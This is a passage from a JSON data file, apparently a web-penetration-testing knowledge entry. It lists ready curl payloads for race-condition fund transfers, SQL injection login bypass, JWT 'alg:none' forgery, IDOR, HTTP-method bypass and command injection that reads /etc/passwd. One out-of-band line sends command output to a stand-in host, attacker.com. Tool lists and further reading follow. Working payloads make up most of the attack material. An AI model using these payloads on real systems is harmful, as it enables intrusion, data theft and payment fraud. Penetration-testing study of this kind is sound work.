\"order_id=12345\"\n\n# Race condition exploitation (parallel processing):\n# Transfer funds twice simultaneously:\ncurl -X POST https://target.com/api/transfer -d \"to=attacker&amount=1000\" &\ncurl -X POST https://target.com/api/transfer -d \"to=attacker&amount=1000\" &\n\n# Discount code stacking:\ncurl -X POST https://target.com/apply-discount \\\n  -d \"code=SAVE10&code=SAVE20&code=SAVE30\"\n```\n\n9. Authentication and Authorization Bypass:\n```bash\n# SQL injection authentication bypass:\n# username: admin'--\n# password: anything\ncurl -X POST https://target.com/login -d \"username=admin'--&password=test\"\n\n# JWT manipulation (algorithm confusion):\n# Change header: {\"alg\":\"RS256\"} → {\"alg\":\"none\"}\n# Remove signature, access admin resources\n\n# IDOR exploitation:\ncurl https://target.com/api/invoice/100 -H \"Cookie: user_session\"\ncurl https://target.com/api/invoice/101 -H \"Cookie: user_session\"  # Access other user's data\n\n# Forced browsing:\ncurl https://target.com/admin/  # 403 Forbidden\ncurl -X POST https://target.com/admin/  # 200 OK (HTTP method bypass)\n```\n\n10. Command Injection via Web Forms:\n```bash\n# Inject commands in web forms:\n# Vulnerable parameter: ping -c 4 <user_input>\ncurl \"https://target.com/ping?host=127.0.0.1;cat%20/etc/passwd\"\ncurl \"https://target.com/ping?host=127.0.0.1%26%26whoami\"\ncurl \"https://target.com/ping?host=127.0.0.1|ls%20-la\"\n\n# Blind command injection (time-based):\ncurl \"https://target.com/diagnostics?cmd=test;sleep%2010\"\n# If response takes 10 seconds, command injection confirmed\n\n# Out-of-band command injection:\ncurl \"https://target.com/diagnostics?cmd=test;curl%20http://attacker.com/$(whoami)\"\n# Check attacker.com logs for exfiltrated data\n```\n\nWHAT TO LOOK FOR:\n- **SQL Injection**: Database errors, UNION-based extraction, blind boolean/time-based queries\n- **XSS**: JavaScript execution in browser, cookie theft, DOM manipulation\n- **File Upload**: Unrestricted file types, webshell access, remote code execution\n- **XXE**: File disclosure, SSRF via XML, out-of-band data exfiltration\n- **SSRF**: Access to internal services, cloud metadata, port scanning\n- **LFI/RFI**: Local file disclosure, log poisoning, remote code inclusion\n- **Business Logic**: Payment bypass, workflow skipping, race conditions\n- **Insecure Deserialization**: Object injection, RCE via serialized data\n- **Command Injection**: System command execution, blind/out-of-band verification\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: SQL injection and file disclosure expose sensitive data\n- **Account Takeover**: XSS and authentication bypass compromise user accounts\n- **Remote Code Execution**: File upload and command injection provide server access\n- **Financial Fraud**: Business logic flaws enable payment bypass and price manipulation\n- **Compliance Violations**: Web vulnerabilities breach OWASP ASVS, PCI DSS 6.5, ISO 27001 A.14.2\n\nCOMMON PITFALLS:\n- **WAF Blocking**: Web Application Firewalls detect and block common payloads\n- **Input Validation**: Modern frameworks implement input sanitization\n- **CSP Headers**: Content Security Policy prevents XSS execution\n- **File Type Validation**: Server-side validation blocks malicious uploads\n- **Context-Specific Payloads**: XSS payload effectiveness depends on injection context (HTML vs JS vs attribute)\n- **Rate Limiting**: Brute-forcing and automated exploitation may be rate-limited\n\nTOOLS REFERENCE:\n- **SQLMap**: https://github.com/sqlmapproject/sqlmap\n- **Burp Suite**: https://portswigger.net/burp\n- **OWASP ZAP**: https://www.zaproxy.org/\n- **BeEF**: https://github.com/beefproject/beef (XSS exploitation framework)\n- **Commix**: https://github.com/commixproject/commix (Command injection)\n- **ysoserial**: https://github.com/frohoff/ysoserial (Java deserialization)\n\nFURTHER READING:\n- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/\n- PortSwigger Web Security Academy: https://portswigger.net/web-security\n- OWASP Top 10: https://owasp.org/www-project-top-ten/\n- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings",
      "tags": ["web-exploitation", "sql-injection", "xss", "file-upload", "xxe", "ssrf", "business-logic"]
    }
  ]
}